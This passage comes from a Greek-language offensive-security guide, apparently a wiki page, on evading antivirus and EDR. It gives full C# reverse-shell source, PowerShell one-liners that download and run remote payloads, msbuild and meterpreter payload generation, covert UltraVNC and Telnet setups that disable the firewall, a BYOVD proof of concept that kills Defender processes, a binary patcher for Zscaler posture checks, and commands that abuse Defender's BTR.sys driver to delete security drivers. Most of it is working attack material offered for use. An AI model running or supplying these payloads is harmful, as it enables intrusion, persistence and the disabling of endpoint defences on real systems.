3. Οι δείκτες που περνούν στον host χρησιμοποιούν `ulong` σε C# και `uint64_t` σε C. Ένας generic dispatcher προωθεί την κλήση στον Win32 handler του host· ένα `out8_mask` επισημαίνει τις πραγματικές θέσεις εξόδου οκτώ byte, των οποίων τα ανώτερα μισά πρέπει να διατηρηθούν. Για τις μη επισημασμένες εξόδους σε μορφή wasm32 χρησιμοποιείται προστασία snapshot/restore, ώστε μια εγγραφή x64 να μην καταστρέψει τα γειτονικά τέσσερα byte.
4. Ειδικά host bridges χειρίζονται λειτουργίες που δεν ταιριάζουν στη γενική dispatch των syscall, όπως πρόσβαση στην cache ticket του LSA, λειτουργίες Kerberos/BCrypt με δομημένα αποτελέσματα, κίνηση TCP KDC και ερωτήματα LDAP.

Για παράδειγμα, ένα wrapper για το `version.dll!VerQueryValueW` περνά τέσσερις διευθύνσεις του host και θέτει τα bits 2 και 3 (`0xC`), επειδή ο δείκτης τιμής και το μήκος είναι θέσεις εξόδου οκτώ byte. Το ίδιο το wrapper παραμένει generic και αναθέτει το όνομα του DLL, το όνομα του export, τα ορίσματα και τη mask στο `wf_call_v2`· ο host εκτελεί τη μετάφραση δεικτών και καλεί το native API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Περιορισμοί και σημεία αλλαγής στην ανίχνευση

Κώδικας με εκτεταμένη χρήση reflection, δυναμική φόρτωση assembly, αυθαίρετα native callbacks και σύνθετες δομές x64 που επιστρέφονται στη μνήμη WASM μπορεί να εξακολουθούν να απαιτούν patches ανά εργαλείο ή να αποτυγχάνουν εντελώς. Τα generic WASI Preview 2 sockets μπορεί επίσης να καταλήγουν σε no-op stubs, γι’ αυτό τα υποστηριζόμενα εργαλεία χρησιμοποιούν host shims ειδικά για κάθε πρωτόκολλο. Επαληθεύστε κάθε εντολή σε native build αντί να υποθέτετε ισοδυναμία λειτουργιών.<sup>[[44]](#references)[[45]](#references)</sup>

Η τεχνική μετατοπίζει την τηλεμετρία αντί να καθιστά το payload αόρατο. Η ανίχνευση μπορεί να στραφεί σε PE που περιέχει ή υλοποιεί ένα WASM module, συμπεριφορά runtime τύπου Wazero, ασυνήθιστη κατανομή και αντιγραφή μνήμης μεταξύ host και guest, generic direct Win32 dispatch, ανωμαλίες στην υπογραφή και τους πόρους PE, καθώς και τις επακόλουθες κλήσεις API και την κίνηση δικτύου. Επομένως, η απουσία συμβάντων CLR-load, AMSI ή .NET ETW δεν πρέπει να θεωρείται ένδειξη ότι μια διεργασία είναι ακίνδυνη.<sup>[[44]](#references)</sup>

## Χρήση άλλων γλωσσών προγραμματισμού

Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατή η εκτέλεση κακόβουλου κώδικα με άλλες γλώσσες, παρέχοντας στο παραβιασμένο μηχάνημα πρόσβαση **στο περιβάλλον interpreter που είναι εγκατεστημένο στο SMB share του Attacker Controlled**.

Επιτρέποντας την πρόσβαση στα Interpreter Binaries και στο περιβάλλον του SMB share, μπορείτε να **εκτελέσετε αυθαίρετο κώδικα σε αυτές τις γλώσσες στη μνήμη** του παραβιασμένου μηχανήματος.

Το repo αναφέρει: το Defender εξακολουθεί να σαρώνει τα scripts, αλλά χρησιμοποιώντας Go, Java, PHP κ.λπ. έχουμε **περισσότερη ευελιξία για την παράκαμψη static signatures**. Οι δοκιμές με τυχαία, μη obfuscated reverse shell scripts σε αυτές τις γλώσσες έχουν αποδειχθεί επιτυχείς.

## Re-hosting WebAssembly για αποφυγή static analysis

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Το Token stomping χειραγωγεί το access token ενός προϊόντος ασφαλείας, όπως ένα EDR ή AV. Η μείωση των προνομίων του token μπορεί να αφήσει τη διεργασία σε λειτουργία, ενώ την εμποδίζει να εκτελεί προνομιούχες ενέργειες επιθεώρησης ή αποκατάστασης.

Για να το αποτρέψουν αυτό, τα Windows θα μπορούσαν να **εμποδίζουν εξωτερικές διεργασίες** να αποκτούν handles στα tokens διεργασιών ασφαλείας.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Χρήση έμπιστου λογισμικού

### Chrome Remote Desktop

Όπως περιγράφεται σε [**αυτή την ανάρτηση ιστολογίου**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο απλώς να εγκαταστήσετε το Chrome Remote Desktop σε υπολογιστή θύματος και έπειτα να το χρησιμοποιήσετε για να αποκτήσετε τον έλεγχό του και να διατηρήσετε persistence:<sup>[[35]](#references)</sup>
1. Κάντε λήψη από το https://remotedesktop.google.com/, πατήστε "Set up via SSH" και έπειτα πατήστε το MSI file για Windows, ώστε να κάνετε λήψη του MSI file.
2. Εκτελέστε σιωπηλά το installer στο θύμα (απαιτούνται δικαιώματα admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Επιστρέψτε στη σελίδα του Chrome Remote Desktop και πατήστε next. Ο wizard θα σας ζητήσει να εξουσιοδοτήσετε τη σύνδεση· πατήστε το κουμπί Authorize για να συνεχίσετε.
4. Εκτελέστε την παρεχόμενη εντολή με τις απαιτούμενες προσαρμογές: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (η παράμετρος `--pin` ορίζει το PIN χωρίς τη χρήση GUI).
 

## Προηγμένη αποφυγή ανίχνευσης

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Η αποφυγή ανίχνευσης είναι ένα πολύ περίπλοκο θέμα· μερικές φορές πρέπει να λάβετε υπόψη πολλές διαφορετικές πηγές τηλεμετρίας σε ένα μόνο σύστημα, οπότε είναι σχεδόν αδύνατο να παραμείνετε εντελώς μη ανιχνεύσιμοι σε ώριμα περιβάλλοντα.

Κάθε περιβάλλον στο οποίο επιχειρείτε να εισέλθετε έχει τα δικά του δυνατά και αδύνατα σημεία.

Σας προτείνω θερμά να παρακολουθήσετε αυτή την ομιλία του [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε μια πρώτη εικόνα των πιο προηγμένων τεχνικών αποφυγής ανίχνευσης.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Αυτή είναι επίσης μια εξαιρετική ομιλία του [@mariuszbit](https://twitter.com/mariuszbit) σχετικά με την εις βάθος αποφυγή ανίχνευσης.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Παλιές τεχνικές**

### **Έλεγχος των τμημάτων που εντοπίζει το Defender ως κακόβουλα**

Μπορείτε να χρησιμοποιήσετε το [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), το οποίο θα **αφαιρεί τμήματα του binary** μέχρι να **εντοπίσει ποιο τμήμα θεωρεί κακόβουλο το Defender** και θα σας το απομονώσει.\
Ένα άλλο εργαλείο που κάνει **το ίδιο είναι το** [**avred**](https://github.com/dobin/avred), το οποίο προσφέρει την υπηρεσία μέσω ανοιχτού web στο [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Μέχρι τα Windows 10, όλα τα Windows περιλάμβαναν έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως administrator) εκτελώντας:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Κάντε το να **ξεκινά** κατά την εκκίνηση του συστήματος και **εκτελέστε** το τώρα:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Αλλάξτε τη θύρα telnet** (stealth) και απενεργοποιήστε το firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (θέλετε τα bin downloads, όχι το setup)

**ΣΤΟ HOST**: Εκτελέστε το _**winvnc.exe**_ και ρυθμίστε τον server:

- Ενεργοποιήστε την επιλογή _Disable TrayIcon_
- Ορίστε έναν κωδικό πρόσβασης στο _VNC Password_
- Ορίστε έναν κωδικό πρόσβασης στο _View-Only Password_

Στη συνέχεια, μεταφέρετε το binary _**winvnc.exe**_ και το νέο αρχείο _**UltraVNC.ini**_ που δημιουργήθηκε μέσα στο **θύμα**

#### **Reverse connection**

Ο **επιτιθέμενος** πρέπει να **εκτελέσει στο** **host** του το binary `vncviewer.exe -listen 5900`, ώστε να είναι **έτοιμος** να δεχτεί μια reverse **VNC connection**. Στη συνέχεια, μέσα στο **θύμα**: Εκκινήστε τον daemon winvnc `winvnc.exe -run` και εκτελέστε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ΠΡΟΕΙΔΟΠΟΙΗΣΗ:** Για να διατηρήσετε τη stealth λειτουργία, μην κάνετε τα εξής:

- Μην εκκινήσετε το `winvnc` αν εκτελείται ήδη, αλλιώς θα εμφανιστεί ένα [popup](https://i.imgur.com/1SROTTl.png). Ελέγξτε αν εκτελείται με `tasklist | findstr winvnc`
- Μην εκκινήσετε το `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο κατάλογο, αλλιώς θα ανοίξει [το παράθυρο ρυθμίσεων](https://i.imgur.com/rfMQWcf.png)
- Μην εκτελέσετε το `winvnc -h` για βοήθεια, αλλιώς θα εμφανιστεί ένα [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Μέσα στο GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Τώρα **εκκινήστε τον lister** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Το τρέχον defender θα τερματίσει τη διεργασία πολύ γρήγορα.**

### Μεταγλώττιση του δικού μας reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Πρώτο C# Revershell

Μεταγλωττίστε το με:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Χρησιμοποιήστε το με:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# με χρήση compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα obfuscators για C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Χρήση της Python ως παράδειγμα κατασκευής injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Περισσότερα

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Απενεργοποίηση AV/EDR από χώρο kernel

Το Storm-2603 χρησιμοποίησε ένα μικροσκοπικό βοηθητικό πρόγραμμα κονσόλας, γνωστό ως **Antivirus Terminator**, για να απενεργοποιήσει τις προστασίες των endpoints πριν από την εγκατάσταση ransomware. Το εργαλείο φέρνει το **δικό του ευάλωτο αλλά *υπογεγραμμένο* driver** και το καταχράται για να εκτελεί προνομιακές λειτουργίες kernel, τις οποίες δεν μπορούν να αποκλείσουν ούτε οι υπηρεσίες AV Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Βασικά σημεία
1. **Υπογεγραμμένος driver**: Το αρχείο που αποθηκεύεται στον δίσκο είναι το `ServiceMouse.sys`, αλλά το δυαδικό αρχείο είναι ο νόμιμα υπογεγραμμένος driver `AToolsKrnl64.sys` από το “System In-Depth Analysis Toolkit” της Antiy Labs. Επειδή ο driver φέρει έγκυρη υπογραφή της Microsoft, φορτώνεται ακόμη κι όταν είναι ενεργοποιημένο το Driver-Signature-Enforcement (DSE).
2. **Εγκατάσταση υπηρεσίας**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Η πρώτη γραμμή καταχωρίζει τον driver ως **kernel service** και η δεύτερη τον εκκινεί, ώστε το `\\.\ServiceMouse` να είναι προσβάσιμο από το userland.
3. **IOCTLs που εκθέτει ο driver**
   | Κωδικός IOCTL | Δυνατότητα                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Τερματισμός αυθαίρετης διεργασίας μέσω PID (χρησιμοποιείται για τον τερματισμό υπηρεσιών Defender/EDR) |
   | `0x990000D0` | Διαγραφή αυθαίρετου αρχείου από τον δίσκο |
   | `0x990001D0` | Απεγκατάσταση του driver και αφαίρεση της υπηρεσίας |

   Ελάχιστο C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Γιατί λειτουργεί**: Το BYOVD παρακάμπτει πλήρως τις προστασίες user-mode· κώδικας που εκτελείται στον kernel μπορεί να ανοίξει *προστατευμένες* διεργασίες, να τις τερματίσει ή να αλλοιώσει αντικείμενα kernel, ανεξάρτητα από τα PPL/PP, ELAM ή άλλες λειτουργίες hardening.

Ανίχνευση / Μετριασμός
• Ενεργοποιήστε τη λίστα αποκλεισμού ευάλωτων driver της Microsoft (`HVCI`, `Smart App Control`), ώστε τα Windows να αρνούνται τη φόρτωση του `AToolsKrnl64.sys`.
• Παρακολουθείτε τη δημιουργία νέων υπηρεσιών *kernel* και ειδοποιηθείτε όταν φορτώνεται driver από κατάλογο εγγράψιμο από όλους ή όταν δεν περιλαμβάνεται στη λίστα επιτρεπόμενων.
• Παρακολουθείτε handles από user-mode προς προσαρμοσμένα device objects, ακολουθούμενα από ύποπτες κλήσεις `DeviceIoControl`.

### Παράκαμψη των ελέγχων posture του Zscaler Client Connector μέσω επιδιόρθωσης δυαδικών αρχείων στον δίσκο

Το **Client Connector** της Zscaler εφαρμόζει τοπικά κανόνες posture συσκευής και βασίζεται στα Windows RPC για να κοινοποιεί τα αποτελέσματα σε άλλα στοιχεία. Δύο αδύναμες σχεδιαστικές επιλογές καθιστούν δυνατή την πλήρη παράκαμψη:

1. Η αξιολόγηση posture γίνεται **εξ ολοκλήρου στην πλευρά του client** (αποστέλλεται μια boolean τιμή στον server).
2. Τα εσωτερικά RPC endpoints ελέγχουν μόνο ότι το εκτελέσιμο αρχείο που συνδέεται είναι **υπογεγραμμένο από τη Zscaler** (μέσω `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Με **επιδιόρθωση τεσσάρων υπογεγραμμένων δυαδικών αρχείων στον δίσκο**, μπορούν να εξουδετερωθούν και οι δύο μηχανισμοί:

| Δυαδικό αρχείο | Αρχική λογική που επιδιορθώνεται | Αποτέλεσμα |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Επιστρέφει πάντα `1`, ώστε κάθε έλεγχος να εμφανίζεται ως συμμορφωμένος |
| `ZSAService.exe` | Έμμεση κλήση στο `WinVerifyTrust` | Γίνεται NOP ⇒ οποιαδήποτε διεργασία (ακόμη και μη υπογεγραμμένη) μπορεί να συνδεθεί στα RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Αντικαθίσταται από `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Έλεγχοι ακεραιότητας του tunnel | Παρακάμπτονται με short-circuit |

Απόσπασμα ελάχιστου patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση της στοίβας υπηρεσιών:

* **Όλοι** οι έλεγχοι στάσης ασφαλείας εμφανίζονται **πράσινοι/συμμορφωμένοι**.
* Μη υπογεγραμμένα ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ο παραβιασμένος host αποκτά απεριόριστη πρόσβαση στο εσωτερικό δίκτυο που ορίζεται από τις πολιτικές του Zscaler.

Αυτή η μελέτη περίπτωσης δείχνει πώς οι αποφάσεις εμπιστοσύνης που λαμβάνονται αποκλειστικά στην πλευρά του client και οι απλοί έλεγχοι υπογραφής μπορούν να παρακαμφθούν με μερικά byte patches.

## Κατάχρηση έμπιστης λειτουργικότητας του Microsoft Defender `BTR.sys`

Ο driver **Boot-Time Removal** του Defender αποτελεί χρήσιμο αντιπαράδειγμα στο κλασικό BYOVD. Το `BTR.sys` είναι ένα νόμιμο remediation component, υπογεγραμμένο από τη Microsoft, χωρίς bug αλλοίωσης μνήμης και χωρίς IOCTL interface· αφού αποκτήσει πρόσβαση διαχειριστή και `SeLoadDriverPrivilege`, ένας operator μπορεί αντί γι’ αυτό να πλαστογραφήσει την ιδιωτική συναλλαγή remediation και να εκτελέσει τις προβλεπόμενες λειτουργίες αρχείων/registry σε Ring-0. Πρόκειται για primitive **εξουδετέρωσης AV/EDR μετά την παραβίαση, όχι για αρχική πρόσβαση ή κλιμάκωση προνομίων**, ενώ ο driver μπορεί να εξαχθεί από το resource `BOOTTIMETOOL` του `MpEngine.dll` του ίδιου του στόχου, αντί να εισαχθεί ένας εμφανώς τρίτος driver.<sup>[[36]](#references)</sup>

### Προετοιμασία του εφάπαξ driver

Κανονικά, το Defender αποθηκεύει το resource ως αρχείο με τυχαίο όνομα `[a-z]{8}.sys` και καταχωρίζει μια υπηρεσία kernel με παρόμοιο όνομα. Η `DriverEntry` διαβάζει την τιμή `Args` της υπηρεσίας, ανοίγει το αναφερόμενο NTFS ADS, αποκρυπτογραφεί και επικυρώνει τη λίστα ενεργειών, καταγράφει τα αποτελέσματα και, μετά την επιτυχή εκτέλεση, επιστρέφει `0xC0000056` (`STATUS_DELETE_PENDING`), ώστε ο driver να αποφορτωθεί αντί να παραμείνει στη μνήμη. Μια πλαστογραφημένη υπηρεσία έχει τις ακόλουθες χαρακτηριστικές τιμές.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Το stream `:changelist` περιέχει ένα blob κρυπτογραφημένο με RC4. Τα builds που αναλύθηκαν επαναχρησιμοποιούν ένα σταθερό κλειδί 256 byte, επομένως η κρυπτογράφηση δεν αποτελεί όριο εξουσιοδότησης. Ένα έγκυρο plaintext έχει μια καθολική κεφαλίδα 24 byte (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC κεφαλίδας και ένα transaction ID που προκύπτει από το payload), ακολουθούμενη από μια διαδρομή feedback σε UTF-16 με τερματισμό null και οποιονδήποτε αριθμό στοιχείων. Κάθε στοιχείο έχει κεφαλίδα 16 byte (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) και δεδομένα ειδικά για την ενέργεια, τα οποία τελειώνουν με **ακριβώς τέσσερα byte NUL**. Κάθε περιοχή κεφαλίδας/δεδομένων ελέγχεται ανεξάρτητα με CRC-32 polynomial `0xEDB88320`, αρχική κατάσταση `0xFFFFFFFF` και **χωρίς τελικό XOR** (`~CRC32`)· η κατάσταση CRC μηδενίζεται για κάθε περιοχή.<sup>[[36]](#references)[[37]](#references)</sup>

Τα αποδεκτά action ID εκθέτουν αυτές τις primitives του kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Δεδομένα στοιχείου | Αποτέλεσμα |
| --- | --- | --- |
| 1 | `[διαδρομή UTF-16]` | Διαγραφή αρχείου, ακόμη και αν είναι κλειδωμένο |
| 2 | `[διαδρομή UTF-16]` | Αφαίρεση κενού καταλόγου |
| 3 | `[Flags][source][destination]` | Μετακίνηση αρχείου σε προστατευμένη διαδρομή που επιλέγει ο attacker· κενός προορισμός σημαίνει διαγραφή |
| 4 | `[Flags][διαδρομή κλειδιού]` | Αναδρομική διαγραφή κλειδιού registry |
| 5 | `[Flags][διαδρομή κλειδιού + "\\" + value]` | Διαγραφή τιμής registry |
| 6 | `[Flags][type][size][διαδρομή κλειδιού + "\\" + value][data]` | Δημιουργία/ενημέρωση τιμής registry και δημιουργία διαδρομών κλειδιών που λείπουν |

Για τις ενέργειες 5 και 6, ο διαχωριστής κλειδιού/τιμής στο wire είναι **δύο διαδοχικά backslash**· μια διαδρομή με τη συνηθισμένη μορφοποίηση δεν θα διαχωριστεί σωστά. Το αρχείο feedback αντικατοπτρίζει σε μεγάλο βαθμό το αίτημα, αλλά τα πρώτα τέσσερα byte δεδομένων κάθε στοιχείου γίνονται το αποτέλεσμα `NTSTATUS`. Για τις ενέργειες 1 και 2, που δεν έχουν πεδίο flags στην αρχή, το BTR μετακινεί τη διαδρομή στα τέσσερα δεσμευμένα byte στο τέλος, ώστε να δημιουργήσει χώρο για αυτήν την κατάσταση.<sup>[[36]](#references)</sup>

### Ροή εργασίας του `BTR_CLI` και χρονικό παράθυρο early-boot

Το [`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) υλοποιεί ολόκληρη την αλυσίδα: εξαγωγή του `BTR.sys` από το τοπικό Defender, δημιουργία των `<random>.sys:changelist` και ενός stream feedback, σειριοποίηση/checksum/κρυπτογράφηση αλυσιδωτών ενεργειών, απευθείας δημιουργία του service registry key και, στη συνέχεια, κλήση του `NtLoadDriver` για `-trigger now` ή διατήρησή του ως driver εκκίνησης συστήματος για `-trigger boot`. Η απευθείας προετοιμασία του registry παρακάμπτει τη συνήθη διαδρομή `CreateServiceW` του SCM και, επομένως, **δεν** δημιουργεί το service-install Event ID 7045. Τα artifacts που ενεργοποιούνται κατά την εκκίνηση μπορούν αργότερα να αφαιρεθούν με `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

